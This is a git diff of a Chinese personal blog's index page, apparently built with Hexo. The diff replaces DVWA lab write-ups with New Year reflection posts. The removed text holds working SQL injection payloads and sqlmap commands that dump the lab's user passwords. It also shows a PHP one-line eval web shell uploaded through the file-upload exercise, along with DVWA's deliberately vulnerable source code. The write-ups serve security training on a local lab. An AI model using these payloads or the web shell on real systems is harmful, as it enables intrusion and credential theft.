&#x3D; $row[&quot;last_name&quot;];</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; Feedback for end user</span><br><span class="line">        echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br &#x2F;&gt;First name: &#123;$first&#125;&lt;br &#x2F;&gt;Surname: &#123;$last&#125;&lt;&#x2F;pre&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; This is used later on in the index.php page</span><br><span class="line">&#x2F;&#x2F; Setting it here so we can close the database connection in here like in the rest of the source scripts</span><br><span class="line">$query  &#x3D; &quot;SELECT COUNT(*) FROM users;&quot;;</span><br><span class="line">$result &#x3D; mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res &#x3D; mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;&#x2F;pre&gt;&#39; );</span><br><span class="line">$number_of_rows &#x3D; mysqli_fetch_row( $result )[0];</span><br><span class="line"></span><br><span class="line">mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>利用mysqli_real_escape_string转义了常用的注入字符，同时用下拉菜单输入控制长度为1，![1554443151578](E:\网络空间信息安全\测试靶场\DVWA\分类详解\SQL Injection\assets\1554443151578.png)</p>
-<p>但可以通过抓包更改</p>
-<p>（1)判断是否存在注入及注入类型</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1 							#正常显示</span><br><span class="line">1&#39;          				#报错</span><br><span class="line">1&#39; or &#39;1&#39;&#x3D;&#39;1				#报错</span><br><span class="line">1 and 1&#x3D;2					#无显示数据</span><br><span class="line">1 or 1&#x3D;1					#正常显示</span><br></pre></td></tr></table></figure>
-
-<p>说明存在数字型注入，因此mysqli_real_escape_string的转义就没有用处了</p>
-<p>（2）判断字段数</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1 order by 10#				#报错</span><br><span class="line">1 order by 5#				#报错</span><br><span class="line">1 order by 3#				#报错</span><br><span class="line">1 order by 2#				正常显示</span><br></pre></td></tr></table></figure>
-
-<p>说明存在两个字段</p>
-<p>（3）判断字段显示顺序</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 union select 1,2 #</span><br></pre></td></tr></table></figure>
-
-<p>![1554443636897](E:\网络空间信息安全\测试靶场\DVWA\分类详解\SQL Injection\assets\1554443636897.png)</p>
-<p>（4）猜数据库名</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 union select 1,database()#</span><br></pre></td></tr></table></figure>
-
-<p>![1554443731195](E:\网络空间信息安全\测试靶场\DVWA\分类详解\SQL Injection\assets\1554443731195.png)</p>
-<p>数据库名为dvwa</p>
-<p>（5）猜表名</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 union select 1,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database() #</span><br></pre></td></tr></table></figure>
-
-<p>![1554444096577](E:\网络空间信息安全\测试靶场\DVWA\分类详解\SQL Injection\assets\1554444096577.png)</p>
-<p>(6)猜列名</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1 union select 1，group(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39;#				#失败，因为&#39;被过滤掉了</span><br><span class="line">id&#x3D;1 union select 1,group_concat(column_name) from information_schema.columns where table_name&#x3D;0x7573657273#			#可以十六进制绕过</span><br></pre></td></tr></table></figure>
-
-<p>![1554444883387](E:\网络空间信息安全\测试靶场\DVWA\分类详解\SQL Injection\assets\1554444883387.png)</p>
-<p>（7）下载数据</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 union select user,password from users #</span><br></pre></td></tr></table></figure>
-
-<p>![1554445203627](E:\网络空间信息安全\测试靶场\DVWA\分类详解\SQL Injection\assets\1554445203627.png)</p>
-<h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_SESSION [ &#39;id&#39; ] ) ) &#123;</span><br><span class="line">    &#x2F;&#x2F; Get input</span><br><span class="line">    $id &#x3D; $_SESSION[ &#39;id&#39; ];</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Check database</span><br><span class="line">    $query  &#x3D; &quot;SELECT first_name, last_name FROM users WHERE user_id &#x3D; &#39;$id&#39; LIMIT 1;&quot;;</span><br><span class="line">    $result &#x3D; mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#39;&lt;pre&gt;Something went wrong.&lt;&#x2F;pre&gt;&#39; );</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Get results</span><br><span class="line">    while( $row &#x3D; mysqli_fetch_assoc( $result ) ) &#123;</span><br><span class="line">        &#x2F;&#x2F; Get values</span><br><span class="line">        $first &#x3D; $row[&quot;first_name&quot;];</span><br><span class="line">        $last  &#x3D; $row[&quot;last_name&quot;];</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; Feedback for end user</span><br><span class="line">        echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br &#x2F;&gt;First name: &#123;$first&#125;&lt;br &#x2F;&gt;Surname: &#123;$last&#125;&lt;&#x2F;pre&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res &#x3D; mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);        </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>审计代码可知，High等级将id的长度限制到了1，但我们可以通过#将其注释掉使其不起作用，注入过程如下：</p>
-<p>（1）判断是否存在注入点，判断注入类型</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1# 						#正常显示</span><br><span class="line">1&#39;#						#正常显示</span><br><span class="line">1 or 1&#x3D;1#				#正常显示</span><br><span class="line">1&#39; or &#39;1&#39;&#x3D;&#39;1&#39;#			#全部显示</span><br></pre></td></tr></table></figure>
-
-<p>存在字符型注入</p>
-<p>（2）判断字段数</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1’ order by 1#			#正常显示</span><br><span class="line">1&#39; order by 2#			#正常显示</span><br><span class="line">1’ order by 3#			#报错</span><br></pre></td></tr></table></figure>
-
-<p>证明字段数为2</p>
-<p>（3）判断字段显示顺序</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;union select 1,2#</span><br></pre></td></tr></table></figure>
-
-<p>![1554446726112](E:\网络空间信息安全\测试靶场\DVWA\分类详解\SQL Injection\assets\1554446726112.png)</p>
-<p>(4)判断数据库名</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; union select 1,database()#</span><br></pre></td></tr></table></figure>
-
-<p>![1554446800656](E:\网络空间信息安全\测试靶场\DVWA\分类详解\SQL Injection\assets\1554446800656.png)</p>
-<p>（5）判断表名</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;dvwa&#39; #</span><br></pre></td></tr></table></figure>
-
-<p>![1554447035009](E:\网络空间信息安全\测试靶场\DVWA\分类详解\SQL Injection\assets\1554447035009.png)</p>
-<p>(6) 判断列名</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; union select 1,group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39; #</span><br></pre></td></tr></table></figure>
-
-<p>![1554447818263](E:\网络空间信息安全\测试靶场\DVWA\分类详解\SQL Injection\assets\1554447818263.png)</p>
-<p>(7)下载数据</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; union select user,password from users#</span><br></pre></td></tr></table></figure>
-
-<p>![1554447921169](E:\网络空间信息安全\测试靶场\DVWA\分类详解\SQL Injection\assets\1554447921169.png)</p>
-<h2 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_GET[ &#39;Submit&#39; ] ) ) &#123;</span><br><span class="line">    &#x2F;&#x2F; Check Anti-CSRF token</span><br><span class="line">    checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; );</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Get input</span><br><span class="line">    $id &#x3D; $_GET[ &#39;id&#39; ];</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Was a number entered?</span><br><span class="line">    if(is_numeric( $id )) &#123;</span><br><span class="line">        &#x2F;&#x2F; Check the database</span><br><span class="line">        $data &#x3D; $db-&gt;prepare( &#39;SELECT first_name, last_name FROM users WHERE user_id &#x3D; (:id) LIMIT 1;&#39; );</span><br><span class="line">        $data-&gt;bindParam( &#39;:id&#39;, $id, PDO::PARAM_INT );</span><br><span class="line">        $data-&gt;execute();</span><br><span class="line">        $row &#x3D; $data-&gt;fetch();</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; Make sure only 1 result is returned</span><br><span class="line">        if( $data-&gt;rowCount() &#x3D;&#x3D; 1 ) &#123;</span><br><span class="line">            &#x2F;&#x2F; Get values</span><br><span class="line">            $first &#x3D; $row[ &#39;first_name&#39; ];</span><br><span class="line">            $last  &#x3D; $row[ &#39;last_name&#39; ];</span><br><span class="line"></span><br><span class="line">            &#x2F;&#x2F; Feedback for end user</span><br><span class="line">            echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br &#x2F;&gt;First name: &#123;$first&#125;&lt;br &#x2F;&gt;Surname: &#123;$last&#125;&lt;&#x2F;pre&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Generate Anti-CSRF token</span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>POD实现了代码与数据分离，无法SQL注入</p>
-
+        <h1 id="记录一下2020年的flag，以此自勉"><a href="#记录一下2020年的flag，以此自勉" class="headerlink" title="记录一下2020年的flag，以此自勉"></a>记录一下2020年的flag，以此自勉</h1><p>接受自我，做真实的自己，“人生如逆途，我亦是行人”。</p>
+        
+          <a class="article-more-a" href="/2020/01/01/Flag-for-2020/#more">more >></a>
+        
       
       
     
@@ -634,11 +490,22 @@
     <div class="article-info article-info-index">
       
       
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">随手小记</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
       
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2020/01/04/DVWA/%E5%88%86%E7%B1%BB%E8%AF%A6%E8%A7%A3/SQL%20Injection/SQL_Injection%E6%89%8B%E6%B3%A8/">展开全文 >></a>
+          <a class="article-more-a" href="/2020/01/01/Flag-for-2020/">展开全文 >></a>
         </p>
       
 
@@ -670,60 +537,30 @@
 
 
   
-    <article id="post-DVWA/分类详解/SQL Injection/Sqlmap自动化注入" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-2019年度总结" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2020/01/04/DVWA/%E5%88%86%E7%B1%BB%E8%AF%A6%E8%A7%A3/SQL%20Injection/Sqlmap%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B3%A8%E5%85%A5/">DVWA/分类详解/SQL Injection/Sqlmap自动化注入</a>
+      <a class="article-title" href="/2019/12/31/2019%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/">2019年度总结</a>
     </h1>
   
 
         
-        <a href="/2020/01/04/DVWA/%E5%88%86%E7%B1%BB%E8%AF%A6%E8%A7%A3/SQL%20Injection/Sqlmap%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B3%A8%E5%85%A5/" class="archive-article-date">
-  	<time datetime="2020-01-03T16:05:17.644Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-01-04</time>
+        <a href="/2019/12/31/2019%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/" class="archive-article-date">
+  	<time datetime="2019-12-31T15:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-12-31</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><p>(1）注入数据库名</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;dvwa&#x2F;vulnerabilities&#x2F;sqli&#x2F;?id&#x3D;1&amp;Submit&#x3D;Submit#&quot; --cookie &quot;security&#x3D;low; PHPSESSID&#x3D;s6k26huoam3i23d5hh60qvavg5&quot; --batch --dbs</span><br></pre></td></tr></table></figure>
-
-<p>![1554556722115](E:\网络空间信息安全\测试靶场\DVWA\分类详解\SQL Injection\assets\1554556722115.png)</p>
-<p>(2)注入表名</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;dvwa&#x2F;vulnerabilities&#x2F;sqli&#x2F;?id&#x3D;1&amp;Submit&#x3D;Submit#&quot; --cookie &quot;security&#x3D;low; PHPSESSID&#x3D;s6k26huoam3i23d5hh60qvavg5&quot; --batch -D dvwa --tables</span><br></pre></td></tr></table></figure>
-
-<p>![1554556820650](E:\网络空间信息安全\测试靶场\DVWA\分类详解\SQL Injection\assets\1554556820650.png)</p>
-<p>（3）注入列名</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;dvwa&#x2F;vulnerabilities&#x2F;sqli&#x2F;?id&#x3D;1&amp;Submit&#x3D;Submit#&quot; --cookie &quot;security&#x3D;low; PHPSESSID&#x3D;s6k26huoam3i23d5hh60qvavg5&quot; --batch -D dvwa -T users --columns</span><br></pre></td></tr></table></figure>
-
-<p>![1554556879095](E:\网络空间信息安全\测试靶场\DVWA\分类详解\SQL Injection\assets\1554556879095.png)</p>
-<p>（4）下载数据</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;dvwa&#x2F;vulnerabilities&#x2F;sqli&#x2F;?id&#x3D;1&amp;Submit&#x3D;Submit#&quot; --cookie &quot;security&#x3D;low; PHPSESSID&#x3D;s6k26huoam3i23d5hh60qvavg5&quot; --batch -D dvwa -T users -C user,password --dump</span><br></pre></td></tr></table></figure>
-
-<p>![1554556930521](E:\网络空间信息安全\测试靶场\DVWA\分类详解\SQL Injection\assets\1554556930521.png)</p>
-<h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><p>抓包，copy to file ,命名为medium.txt 放在kali root用户根目录下</p>
-<p>（1）注入数据库名</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r medium.txt --batch --dbs</span><br></pre></td></tr></table></figure>
-
-<p>![1554557383077](E:\网络空间信息安全\测试靶场\DVWA\分类详解\SQL Injection\assets\1554557383077.png)</p>
-<p>（2）注入表名</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r medium.txt --batch -D dvwa --tables</span><br></pre></td></tr></table></figure>
-
-<p>![1554557397638](E:\网络空间信息安全\测试靶场\DVWA\分类详解\SQL Injection\assets\1554557397638.png)</p>
-<p>（3）注入列名</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r medium.txt --batch -D dvwa -T users --columns</span><br></pre></td></tr></table></figure>
-
-<p>![1554557467043](E:\网络空间信息安全\测试靶场\DVWA\分类详解\SQL Injection\assets\1554557467043.png)</p>
-<p>（4）下载数据</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r medium.txt --batch -D dvwa -T users -C user,password --dump</span><br></pre></td></tr></table></figure>
-
-<p>![1554557531733](E:\网络空间信息安全\测试靶场\DVWA\分类详解\SQL Injection\assets\1554557531733.png)</p>
-<h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><h2 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h2>
+        2019年终于过去，进入了大三也已经半年，今天结束了编译原理的期末考试，距离下一场计组还有六天的时间，停下来转眼看看这一年，并简单记录一下这一年的自我感受。
+        
+          <a class="article-more-a" href="/2019/12/31/2019%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/#more">more >></a>
+        
       
       
     
@@ -734,11 +571,22 @@
     <div class="article-info article-info-index">
       
       
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">随手小记</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
       
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2020/01/04/DVWA/%E5%88%86%E7%B1%BB%E8%AF%A6%E8%A7%A3/SQL%20Injection/Sqlmap%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B3%A8%E5%85%A5/">展开全文 >></a>
+          <a class="article-more-a" href="/2019/12/31/2019%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/">展开全文 >></a>
         </p>
       
 
@@ -770,382 +618,6 @@
 
 
   
-    <article id="post-DVWA/分类详解/SQL Injection/Sqlmap使用" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/01/04/DVWA/%E5%88%86%E7%B1%BB%E8%AF%A6%E8%A7%A3/SQL%20Injection/Sqlmap%E4%BD%BF%E7%94%A8/">DVWA/分类详解/SQL Injection/Sqlmap使用</a>
-    </h1>
-  
-
-        
-        <a href="/2020/01/04/DVWA/%E5%88%86%E7%B1%BB%E8%AF%A6%E8%A7%A3/SQL%20Injection/Sqlmap%E4%BD%BF%E7%94%A8/" class="archive-article-date">
-  	<time datetime="2020-01-03T16:05:17.636Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-01-04</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="sqlmap介绍"><a href="#sqlmap介绍" class="headerlink" title="sqlmap介绍"></a>sqlmap介绍</h1><h2 id="常用参数"><a href="#常用参数" class="headerlink" title="常用参数"></a>常用参数</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">--batch				#默认为yes</span><br><span class="line">--dbs				#枚举数据库</span><br><span class="line">--current-db		#指定当前数据库</span><br><span class="line">--users				#枚举数据库用户</span><br><span class="line">-D 库名			   #指定数据库</span><br><span class="line">--tables 			#枚举表明</span><br><span class="line">-T 表名			   #制定表</span><br><span class="line">--columns			#枚举列名</span><br><span class="line">—C 列名			   #指定列名</span><br><span class="line">--dump(-all)		#获取数据</span><br><span class="line">--level       		#执行测试的等级（1~5）</span><br><span class="line">--risk				#执行测试的风险（1~3）</span><br><span class="line">--string			#匹配指定字符串</span><br></pre></td></tr></table></figure>
-
-
-      
-      
-    
-      <div class="declare" hidden="hidden"></div>
-    
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2020/01/04/DVWA/%E5%88%86%E7%B1%BB%E8%AF%A6%E8%A7%A3/SQL%20Injection/Sqlmap%E4%BD%BF%E7%94%A8/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-<!--显示阅读次数-->
-
-
-  
-    <article id="post-DVWA/分类详解/File upload/File_upload" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/01/04/DVWA/%E5%88%86%E7%B1%BB%E8%AF%A6%E8%A7%A3/File%20upload/File_upload/">DVWA/分类详解/File upload/File_upload</a>
-    </h1>
-  
-
-        
-        <a href="/2020/01/04/DVWA/%E5%88%86%E7%B1%BB%E8%AF%A6%E8%A7%A3/File%20upload/File_upload/" class="archive-article-date">
-  	<time datetime="2020-01-03T16:05:17.565Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-01-04</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="File-upload"><a href="#File-upload" class="headerlink" title="File upload"></a>File upload</h1><h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &#39;Upload&#39; ] ) ) &#123; </span><br><span class="line">    &#x2F;&#x2F; Where are we going to be writing to? </span><br><span class="line">    $target_path  &#x3D; DVWA_WEB_PAGE_TO_ROOT . &quot;hackable&#x2F;uploads&#x2F;&quot;; </span><br><span class="line">    $target_path .&#x3D; basename( $_FILES[ &#39;uploaded&#39; ][ &#39;name&#39; ] ); </span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Can we move the file to the upload folder? </span><br><span class="line">    if( !move_uploaded_file( $_FILES[ &#39;uploaded&#39; ][ &#39;tmp_name&#39; ], $target_path ) ) &#123; </span><br><span class="line">        &#x2F;&#x2F; No </span><br><span class="line">        echo &#39;&lt;pre&gt;Your image was not uploaded.&lt;&#x2F;pre&gt;&#39;; </span><br><span class="line">    &#125; </span><br><span class="line">    else &#123; </span><br><span class="line">        &#x2F;&#x2F; Yes! </span><br><span class="line">        echo &quot;&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;&#x2F;pre&gt;&quot;; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>可以看到low级别的代码没有进行任何过滤，可以直接上传一句话木马</p>
-<p>一句话木马如下shell.php，内容如下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&#39;shell&#39;]);?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>![1554621149171](E:\网络空间信息安全\测试靶场\DVWA\分类详解\File upload\assets\1554621149171.png)</p>
-<p>上传成功并且知道路径，可以直接菜刀连接获得shell</p>
-<p>![1554621190873](E:\网络空间信息安全\测试靶场\DVWA\分类详解\File upload\assets\1554621190873.png)</p>
-<h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &#39;Upload&#39; ] ) ) &#123; </span><br><span class="line">    &#x2F;&#x2F; Where are we going to be writing to? </span><br><span class="line">    $target_path  &#x3D; DVWA_WEB_PAGE_TO_ROOT . &quot;hackable&#x2F;uploads&#x2F;&quot;; </span><br><span class="line">    $target_path .&#x3D; basename( $_FILES[ &#39;uploaded&#39; ][ &#39;name&#39; ] ); </span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; File information </span><br><span class="line">    $uploaded_name &#x3D; $_FILES[ &#39;uploaded&#39; ][ &#39;name&#39; ]; </span><br><span class="line">    $uploaded_type &#x3D; $_FILES[ &#39;uploaded&#39; ][ &#39;type&#39; ]; </span><br><span class="line">    $uploaded_size &#x3D; $_FILES[ &#39;uploaded&#39; ][ &#39;size&#39; ]; </span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Is it an image? </span><br><span class="line">    if( ( $uploaded_type &#x3D;&#x3D; &quot;image&#x2F;jpeg&quot; || $uploaded_type &#x3D;&#x3D; &quot;image&#x2F;png&quot; ) &amp;&amp; </span><br><span class="line">        ( $uploaded_size &lt; 100000 ) ) &#123; </span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; Can we move the file to the upload folder? </span><br><span class="line">        if( !move_uploaded_file( $_FILES[ &#39;uploaded&#39; ][ &#39;tmp_name&#39; ], $target_path ) ) &#123; </span><br><span class="line">            &#x2F;&#x2F; No </span><br><span 